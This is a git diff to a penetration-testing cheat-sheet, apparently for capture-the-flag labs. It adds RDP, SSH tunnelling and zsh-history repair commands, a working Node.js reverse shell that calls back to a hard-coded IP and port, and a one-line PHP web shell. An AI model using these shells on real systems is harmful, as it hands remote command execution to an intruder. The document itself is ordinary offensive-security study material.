@@ -30,10 +30,20 @@ type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Co
 ```
 
 ## Serving Files From Your Host
-```python
+```bash
 python3 -m  http.server
 ```
 - WGET: Allows us to download files from the web using HTTP
+
+## Connect to RDP
+```bash
+user@kali$ xfreerdp /v:10.10.93.212 /u:kid /p:pass
+```
+
+## SSH Tunneling / Port Forwarding
+```bash
+user@kali$ ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm
+```
 
 ## Create an alias
 An alias is a string of characters that represent a command. Aliases make it easier to run long commands.
@@ -58,6 +68,48 @@ server
 addr
 ```
 
+## ZShell Corrupt History
+
+Error: `zsh: corrupt history file /home/user1/.zsh_history`
+```bash
+┌──(user1㉿kali)-[~]
+└─$ cd           
+                                                                                                                                                                                             
+┌──(user1㉿kali)-[~]
+└─$ mv .zsh_history .zsh_history_bad
+                                                                                                                                                                                             
+┌──(user1㉿kali)-[~]
+└─$ strings .zsh_history_bad > .zsh_history
+                                                                                                                                                                                             
+┌──(user1㉿kali)-[~]
+└─$ fc -R .zsh_history
+                                                                                                                                                                                             
+┌──(user1㉿kali)-[~]
+└─$ rm ~/.zsh_history_bad
+                                                                                                                                                                                             
+┌──(user1㉿kali)-[~]
+└─$ 
+```
+
+## Node Shell
+```javascript
+(function(){ 
+	var net = require('net'), 
+	cp = require('child_process'), 
+	sh = cp.spawn('/bin/sh', []); 
+	var client = new net.Socket(); 
+	client.connect(1223, '10.6.57.139', function(){ 
+		client.pipe(sh.stdin); 
+		sh.stdout.pipe(client); 
+		sh.stderr.pipe(client); 
+		}); 
+	return /a/;
+})();
+```
+## PHP Web Shell
+```php
+<?php echo system($_GET["cmd"]); ?>
+```
 
  ## PHP Reverse Shell (PentestMoneky)
 
